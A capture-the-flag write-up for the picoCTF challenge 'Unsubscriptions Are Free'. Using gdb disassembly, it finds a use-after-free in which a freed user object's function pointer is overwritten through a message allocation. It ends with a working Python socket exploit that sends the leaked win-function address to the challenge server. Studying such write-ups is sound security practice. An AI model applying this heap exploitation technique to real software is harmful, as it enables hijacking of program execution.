# CTF Writeup: PicoCTF - Unsubscriptions Are Free

## Challenge Description

Check out my new video-game and spaghetti-eating streaming channel on Twixer! program and get a flag. source nc mercury.picoctf.net 58574


## Solution

### Introduction

The challenge provides us with a binary named vuln. After running the program, we are prompted with a CLI menu.

```
$ ./vuln
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit

```

### The winning function

When performing the `(S)ubscribe to my channel` option, we reveal the `hahaexploitgobrrr` function. After reverse engineering this function in `gdb`, we notice that it will reveal the flag for us if called.

```
S
OOP! Memory leak...0x80487d6
Thanks for subsribing! I really recommend becoming a premium member!
...
```

```
$ gdb vuln
(gdb) set disassembly-flavor intel
(gdb) disassemble 0x80487d6
Dump of assembler code for function hahaexploitgobrrr:
   0x080487d6 <+0>:	push   ebp
   0x080487d7 <+1>:	mov    ebp,esp
   0x080487d9 <+3>:	push   ebx
   0x080487da <+4>:	sub    esp,0xd4
   0x080487e0 <+10>:	call   0x8048710 <__x86.get_pc_thunk.bx>
   0x080487e5 <+15>:	add    ebx,0x281b
   0x080487eb <+21>:	mov    eax,gs:0x14
   0x080487f1 <+27>:	mov    DWORD PTR [ebp-0xc],eax
   0x080487f4 <+30>:	xor    eax,eax
   0x080487f6 <+32>:	sub    esp,0x8
   0x080487f9 <+35>:	lea    eax,[ebx-0x21c0]
   0x080487ff <+41>:	push   eax
   0x08048800 <+42>:	lea    eax,[ebx-0x21be]		# "flag.txt"
   0x08048806 <+48>:	push   eax
   0x08048807 <+49>:	call   0x8048670 <fopen@plt>
   0x0804880c <+54>:	add    esp,0x10
   0x0804880f <+57>:	mov    DWORD PTR [ebp-0xd8],eax
   0x08048815 <+63>:	sub    esp,0x4
   0x08048818 <+66>:	push   DWORD PTR [ebp-0xd8]
   0x0804881e <+72>:	push   0xc8
   0x08048823 <+77>:	lea    eax,[ebp-0xd4]
   0x08048829 <+83>:	push   eax
   0x0804882a <+84>:	call   0x80485f0 <fgets@plt>
   0x0804882f <+89>:	add    esp,0x10
   0x08048832 <+92>:	mov    eax,DWORD PTR [ebx-0x4]
   0x08048838 <+98>:	mov    eax,DWORD PTR [eax]
   0x0804883a <+100>:	sub    esp,0x4
   0x0804883d <+103>:	lea    edx,[ebp-0xd4]
   0x08048843 <+109>:	push   edx
   0x08048844 <+110>:	lea    edx,[ebx-0x21b5]
   0x0804884a <+116>:	push   edx
   0x0804884b <+117>:	push   eax
   0x0804884c <+118>:	call   0x8048660 <fprintf@plt>
   0x08048851 <+123>:	add    esp,0x10
   0x08048854 <+126>:	mov    eax,DWORD PTR [ebx-0x4]
   0x0804885a <+132>:	mov    eax,DWORD PTR [eax]
   0x0804885c <+134>:	sub    esp,0xc
   0x0804885f <+137>:	push   eax
   0x08048860 <+138>:	call   0x80485c0 <fflush@plt>
   0x08048865 <+143>:	add    esp,0x10
   0x08048868 <+146>:	nop
   0x08048869 <+147>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804886c <+150>:	xor    eax,DWORD PTR gs:0x14
   0x08048873 <+157>:	je     0x804887a <hahaexploitgobrrr+164>
   0x08048875 <+159>:	call   0x8048e10 <__stack_chk_fail_local>
   0x0804887a <+164>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804887d <+167>:	leave  
   0x0804887e <+168>:	ret    
End of assembler dump

```

### Debugging the program

Now, we have to find a way to call the hahaexploitgobrrr function. After debugging the main function, all we notice is that the program is looping for user input. It also pushes a user variable to the doProcess function which will then perform

```
(gdb) disassemble main
Dump of assembler code for function main:
   
...
   0x08048d5d <+40>:	call   0x8048590 <setbuf@plt>
   0x08048d62 <+45>:	add    esp,0x10
   0x08048d65 <+48>:	sub    esp,0xc
   0x08048d68 <+51>:	push   0x4
   0x08048d6a <+53>:	call   0x8048620 <malloc@plt>
   0x08048d6f <+58>:	add    esp,0x10
   0x08048d72 <+61>:	mov    edx,eax
   0x08048d74 <+63>:	mov    eax,0x804b060
   0x08048d7a <+69>:	mov    DWORD PTR [eax],edx
   0x08048d7c <+71>:	call   0x8048b2d <printMenu>
   0x08048d81 <+76>:	call   0x8048bd5 <processInput>
   0x08048d86 <+81>:	mov    eax,0x804b060
   0x08048d8c <+87>:	mov    eax,DWORD PTR [eax]
   0x08048d8e <+89>:	sub    esp,0xc
   0x08048d91 <+92>:	push   eax
   0x08048d92 <+93>:	call   0x804896e <doProcess>
   0x08048d97 <+98>:	add    esp,0x10
   0x08048d9a <+101>:	jmp    0x8048d7c <main+71>
End of assembler dump.

(gdb) x 0x804b060
0x804b060 <user>:	0x00000000

(gdb) disassemble doProcess 
Dump of assembler code for function doProcess:
   0x0804896e <+0>:	push   ebp
   0x0804896f <+1>:	mov    ebp,esp
   0x08048971 <+3>:	sub    esp,0x8
   0x08048974 <+6>:	call   0x8048d9c <__x86.get_pc_thunk.ax>
   0x08048979 <+11>:	add    eax,0x2687
   0x0804897e <+16>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048981 <+19>:	mov    eax,DWORD PTR [eax]
   0x08048983 <+21>:	call   eax
   0x08048985 <+23>:	nop
   0x08048986 <+24>:	leave  
   0x08048987 <+25>:	ret    
End of assembler dump.

```

Now here is part of the processInput function which is called when we inquire for an account deletion which will free the user object.

```
(gdb) disassemble processInput
...
   0x08048c95 <+192>:   mov    eax,0x804b060                        # inquire_about_account_deletion:
   0x08048c9b <+198>:   mov    eax,DWORD PTR [eax]
   0x08048c9d <+200>:   lea    edx,[ebx-0x2581]				# 0x8048a7f
   0x08048ca3 <+206>:   mov    DWORD PTR [eax],edx
   0x08048ca5 <+208>:   jmp    0x8048d2f <processInput+346>             # jmp continue
...

(gdb) disassemble 0x8048a7f
...
   0x08048aeb <+108>:	add    esp,0x10
   0x08048aee <+111>:	mov    eax,0x804b060
   0x08048af4 <+117>:	mov    eax,DWORD PTR [eax]
   0x08048af6 <+119>:	sub    esp,0xc
   0x08048af9 <+122>:	push   eax
   0x08048afa <+123>:	call   0x80485d0 <free@plt>
...
```

Looking at the other options in the CLI menu let's observe leaveMessage which will potentially add a message to the heap.

```
(gdb) disassemble leaveMessage
Dump of assembler code for function leaveMessage:
   0x08048a21 <+0>:	push   ebp
   0x08048a22 <+1>:	mov    ebp,esp
   0x08048a24 <+3>:	push   ebx
   0x08048a25 <+4>:	sub    esp,0x14
   0x08048a28 <+7>:	call   0x8048710 <__x86.get_pc_thunk.bx>
   0x08048a2d <+12>:	add    ebx,0x25d3
   0x08048a33 <+18>:	sub    esp,0xc
   0x08048a36 <+21>:	lea    eax,[ebx-0x20dc]
   0x08048a3c <+27>:	push   eax
   0x08048a3d <+28>:	call   0x8048630 <puts@plt>
   0x08048a42 <+33>:	add    esp,0x10
   0x08048a45 <+36>:	sub    esp,0xc
   0x08048a48 <+39>:	lea    eax,[ebx-0x20ab]
   0x08048a4e <+45>:	push   eax
   0x08048a4f <+46>:	call   0x8048630 <puts@plt>
   0x08048a54 <+51>:	add    esp,0x10
   0x08048a57 <+54>:	sub    esp,0xc
   0x08048a5a <+57>:	push   0x8
   0x08048a5c <+59>:	call   0x8048620 <malloc@plt>
   0x08048a61 <+64>:	add    esp,0x10
   0x08048a64 <+67>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048a67 <+70>:	sub    esp,0x4
   0x08048a6a <+73>:	push   0x8
   0x08048a6c <+75>:	push   DWORD PTR [ebp-0xc]
   0x08048a6f <+78>:	push   0x0
   0x08048a71 <+80>:	call   0x80485a0 <read@plt>
   0x08048a76 <+85>:	add    esp,0x10
   0x08048a79 <+88>:	nop
   0x08048a7a <+89>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048a7d <+92>:	leave  
   0x08048a7e <+93>:	ret    
End of assembler dump.
```

Knowing that the user address is always pushed to eax and is called in the doProcess function, if we can right data on the heap to overwrite the user object, we may be able to redirect code execution and call the winner function to get the flag.


### Running the program

```
(gdb) break *0x08048a76
(gdb) r
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/john/CTF/picoctf/unsubscriptions_are_free/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
M
===========================
Registration: Welcome to Twixer!
Enter your username: 
AAAA
Account created.
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
I
You're leaving already(Y/N)?
Y
Bye!
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
l
I only read premium member messages but you can 
try anyways:
BBBB

Breakpoint 5, 0x08048a76 in leaveMessage ()
(gdb) x 0x804b060
0x804b060 <user>:	0x0804c1a0
(gdb) x 0x0804c1a0
0x804c1a0:	0x42424242
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```

### Creating the exploit and getting the flag

Now that we successfully were able to redirect code execution, let's create an exploit script to get the flag.

```python
import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("mercury.picoctf.net", 58574))

s.recv(1024).decode()
s.recv(1024).decode()

s.send(b'M')

s.recv(1024).decode()
s.recv(1024).decode()

s.send(b'asdf\n')

s.recv(1024).decode()
s.recv(1024).decode()

s.send(b'S')

s.recv(19).decode()

addr = s.recv(19)[2:-1]

print(addr)
hahaexploitgobrrr = struct.pack("I", int(addr, 16))

s.recv(1024).decode()

s.send(b'I')

s.recv(1024).decode()

s.send(b'Y')

s.recv(1024).decode()
s.recv(1024).decode()

s.send(b'L')

s.recv(1024).decode()
s.recv(1024).decode()

s.send(hahaexploitgobrrr)

print(s.recv(1024).decode())
s.recv(1024).decode()

```

```
john@john:~/CTF/picoctf/unsubscriptions_are_free$ python3 exploit.py 
b'80487d6'
picoCTF{d0ubl3_j30p4rdy_ec42c6fc}
```
